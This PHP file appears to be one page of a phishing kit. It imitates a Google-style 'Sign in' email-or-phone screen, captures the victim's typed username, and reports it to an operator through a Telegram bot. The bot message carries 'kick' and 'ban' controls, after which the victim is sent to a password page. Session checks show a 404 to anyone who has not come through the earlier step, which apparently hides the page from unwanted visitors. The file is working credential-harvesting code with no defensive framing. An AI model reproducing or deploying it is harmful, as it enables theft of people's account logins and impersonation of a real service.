<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ob_start();

include_once(__DIR__ . '/../includes/php/error_check.php');

if(!isset($_SESSION['step-1']) || isset($_SESSION['404-blocked']) || isset($_SESSION['complete'])){
    header("HTTP/1.0 404 Not Found");
    exit();
}

require_once(__DIR__ . '/../includes/php/detect.php');
require_once(__DIR__ . '/../includes/php/config.php');

$target = checkCommand();
if ($target !== '') {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

require(__DIR__ . '/../includes/php/bot_api.php');
require(__DIR__ . '/../includes/php/bot_reply.php');
require_once(__DIR__ . '/../includes/php/buttons.php');

if(!isset($_SESSION['step-2'])) $_SESSION['step-2'] = true;

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    if(!empty($_POST['username'])){

      if(!isset($_SESSION['login_counter'])) $_SESSION['login_counter'] = 0;

      if(isset($_SESSION['login_err'])) unset($_SESSION['login_err']);
      
      $_SESSION['username'] = $_POST['username'];
      $_SESSION['login_counter']++;
      
      $buttons = getButtons('kick_ban', $_SESSION['unique_id']);
   
      $activity['status'] = '🟢';
      $activity['step'] = '👁️ Proccessing';
      
      include(__DIR__ . '/../includes/php/texts.php');
      
      $status = bot_api('editMessageText', $message, $buttons);
      
      if (!bot_api_telegram_ok($status)) {
          die('{"error":true, "description": "telegram bot api"}');
      }

      $step = 1;
      require(__DIR__ . '/../includes/php/logs_text.php');
      
      bot_reply('🔔👤');

      header('location: password.php');
      exit();
   }
}else{
   $buttons = array(
      'inline_keyboard' => array(
        array(
         array('text' => '❕KICK USER❕', 'callback_data' => $_SESSION['unique_id'] . ' kick_user'),
         array('text' => '❗BAN USER❗', 'callback_data' => $_SESSION['unique_id'] . ' ban_user'),
        ),
      )
   );

   $activity['status'] = '🟢';
   $activity['step'] = '👁️ Sign in - Email or phone';

   include(__DIR__ . '/../includes/php/texts.php');

   bot_api('editMessageText', $message, $buttons);
}


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="media/7611770.png" type="image/x-icon">
</head>
<body>
    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                            <div class="ObDc3 ZYOIke 0-7-15-20 0-6-14-19">
                                    <h1 class="vAV9bf 0-8-20-21 0-7-19-20" id="headingText"><span class="0-9-21-22 0-8-20-21">Sign in</span></h1>
                                    <div class="gNJDp 0-8-20-23 0-7-19-22" id="headingSubtext"><span class="0-9-23-24 0-8-22-23">Use your Account</span></div>
                                </div>
                            </div>
                            <div class="UXFQgc 0-6-14-25 0-5-13-24">
                                <div class="qWK5J 0-7-25-26 0-6-24-25">
                                    <div class="xKcayf 0-8-26-27 0-7-25-26">
                                        <div class="AcKKx 0-9-27-28 0-8-26-27">
                                            <form method="post" novalidate="" class="0-10-28-29 0-9-27-28">
                                                <span class="0-11-29-30 0-10-28-29">
                                                    <section class="Em2Ord 0-12-30-31 0-11-29-30">
                                                        <header class="vYeFie 0-13-31-32 0-12-30-31" aria-hidden="true"></header>
                                                        <div class="yTaH4c 0-13-31-33 0-12-30-32">
                                                            <div class="0-14-33-34 0-13-32-33">
                                                                <div class="AFTWye vEQsqe 0-15-34-35 0-14-33-34">
                                                                    <div id="userLabel" class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc Tyc9J">
                                                                        <div class="aCsJod oJeWuf 0-17-36-37 0-16-35-36">
                                                                            <div class="aXBtI Wic03c 0-18-37-38 0-17-36-37">
                                                                                <div class="Xb9hP 0-19-38-39 0-18-37-38">
                                                                                    <input type="email" class="whsOnd zHQkBf 0-20-39-40 0-19-38-39" autocomplete="off" spellcheck="false" tabindex="0" name="username" value=""  id="username" dir="ltr">
                                                                                    <div class="AxOyFc snByac 0-20-39-41 0-19-38-40" aria-hidden="true">Email or phone</div>
                                                                                </div>
                                                                                <div class="i9lrp mIZh1c 0-19-38-42 0-18-37-41"></div>
                                                                                <div class="OabDMe cXrdqd Y2Zypf 0-19-38-43 0-18-37-42" id="style-egogs"></div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="LXRPh 0-17-36-44 0-16-35-43">
                                                                            <div class="ovnfwe Is7Fhb 0-18-44-45 0-17-43-44"></div>
                                                                            <div id="errorUsername" class="dEOOab RxsGPe 0-18-44-46 0-17-43-45 <?php if(!isset($_SESSION['login_err'])) { echo 'hidden'; } ?>">
                                                                                <div class="Ekjuhf Jj6Lae ">
                                                                                    <span class="AfGCob">
                                                                                    <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                                                    </svg>
                                                                                    </span>
                                                                                    Enter an email or phone number
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="dMNVAe 0-15-34-47 0-14-33-46" aria-live="assertive"></div>
                                                                <div class="dMNVAe 0-15-34-48 0-14-33-47">
                                                                    <button type="button" class="0-16-48-49 0-15-47-48">Forgot email?</button>
                                                                </div>
                                                                
                                                            </div>
                                                            <div class="dgb5Cf 0-14-33-77 0-13-32-76"></div>
                                                            <div class="VfPpkd-RLmnJb 0-13-32-78 0-12-31-77"></div>
                                                        </div>
                                                        <footer class="RY3tic 0-12-30-79 0-11-29-78"></footer>
                                                    </section>
                                                </span>
                                            </form>
                                            
                                        </div>
                                        <div class="0-9-27-84 0-8-26-83">
                                            <div class="RDsYTb 0-10-84-85 0-9-83-84">
                                                <div class="dMNVAe 0-11-85-86 0-10-84-85">Not your computer? Use Guest mode to sign in privately. <a href="javascript:void(0);" class="0-12-86-87 0-11-85-86">Learn more about using Guest mode</a></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="JYXaTc 0-6-14-88 0-5-13-87">
                                <div class="O1Slxf 0-7-88-89 0-6-87-88">
                                    <div class="TNTaPb 0-8-89-90 0-7-88-89">
                                        <div class="XjS9D TrZEUc 0-9-90-91 0-8-89-90" id="identifierNext">
                                            <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-10-91-92 0-9-90-91">
                                                <button id="nextToPassword" class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b 0-11-92-93 0-10-91-92" type="submit">
                                                    <div class="VfPpkd-Jh9lGc 0-12-93-94 0-11-92-93"></div>
                                                    <div class="VfPpkd-J1Ukfc-LhBDec 0-12-93-95 0-11-92-94"></div>
                                                    <div class="VfPpkd-RLmnJb 0-12-93-96 0-11-92-95"></div><span class="VfPpkd-vQzf8d 0-12-93-97 0-11-92-96">Next</span>
                                                </button></div>
                                        </div>
                                    </div>
                                    <div class="FO2vFd 0-8-89-98 0-7-88-97">
                                        <div class="n3Clv 0-9-98-99 0-8-97-98">
                                            <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd XjS9D 0-10-99-100 0-9-98-99">
                                                <div class="0-11-100-101 0-10-99-100">
                                                    <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-12-101-102 0-11-100-101"><button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc J7pUA 0-13-102-103 0-12-101-102" type="button">
                                                            <div class="VfPpkd-Jh9lGc 0-14-103-104 0-13-102-103"></div>
                                                            <div class="VfPpkd-J1Ukfc-LhBDec 0-14-103-105 0-13-102-104"></div>
                                                            <div class="VfPpkd-RLmnJb 0-14-103-106 0-13-102-105"></div><span class="VfPpkd-vQzf8d 0-14-103-107 0-13-102-106">Forgot password?</span>
                                                        </button></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
        <?php $footer_html = TRUE; require_once(__DIR__ . '/html/footer.php'); ?>
    <script src="js/log.js"></script>
</body>
</html>